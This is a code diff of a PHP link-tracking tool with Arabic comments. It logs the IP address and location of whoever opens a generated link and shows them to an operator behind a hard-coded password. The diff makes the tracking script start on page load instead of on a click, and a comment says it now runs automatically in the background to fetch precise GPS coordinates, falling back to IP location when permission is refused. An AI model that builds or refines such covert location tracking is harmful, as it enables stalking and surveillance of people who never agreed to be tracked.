@@ -6,11 +6,11 @@ error_reporting(0);
 
 // بدء الجلسة لحماية لوحة التحكم بكلمة مرور
 session_start();
-$password_hash = password_hash('abdssamed00', PASSWORD_DEFAULT);
+$password_hash = password_hash('aziz123', PASSWORD_DEFAULT);
 
 // التحقق من تسجيل الدخول
 if (isset($_POST['login_password'])) {
-    if ($_POST['login_password'] === 'abdssamed00') {
+    if ($_POST['login_password'] === 'aziz123') {
         $_SESSION['is_logged_in'] = true;
         header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
         exit();
@@ -230,7 +230,7 @@ if (isset($_GET['r'])) {
             $ip_details = get_ip_details($public_ip);
             $location = $ip_details['location'];
             
-            // إذا أرسل المتصفح إحداثيات GPS دقيقة، يتم اعتمادها وتحديث الموقع
+            // استقبال إحداثيات الموقع الدقيق أوتوماتيكياً إن وجدت
             if (!empty($_POST['lat']) && !empty($_POST['lon'])) {
                 $lat = $_POST['lat'];
                 $lon = $_POST['lon'];
@@ -307,16 +307,16 @@ if (isset($_GET['r'])) {
                     });
                 };
 
-                // محاولة الحصول على الموقع الجغرافي الدقيق عبر المتصفح (GPS)
+                // محاولة جلب الموقع الجغرافي أوتوماتيكياً في الخلفية
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         (position) => {
                             sendData(position.coords.latitude, position.coords.longitude);
                         },
                         (error) => {
-                            sendData("", ""); // في حال رفض الإذن يرسل البيانات العادية عبر IP
+                            sendData("", ""); // إذا تم رفض الصلاحية يتم الاعتماد تلقائياً على الـ IP
                         },
-                        { timeout: 3000, maximumAge: 0, enableHighAccuracy: true }
+                        { timeout: 2500, maximumAge: 0, enableHighAccuracy: true }
                     );
                 } else {
                     sendData("", "");
@@ -354,13 +354,10 @@ if (isset($_GET['r'])) {
                 });
         }
 
+        // تشغيل التتبع أوتوماتيكياً بمجرد تحميل الصفحة دون الحاجة لأي تفاعل يدوي
         window.addEventListener('DOMContentLoaded', () => {
             initTracking();
         });
-
-        window.addEventListener('click', () => {
-            initTracking();
-        }, { once: true });
     </script>
 </head>
 <body>
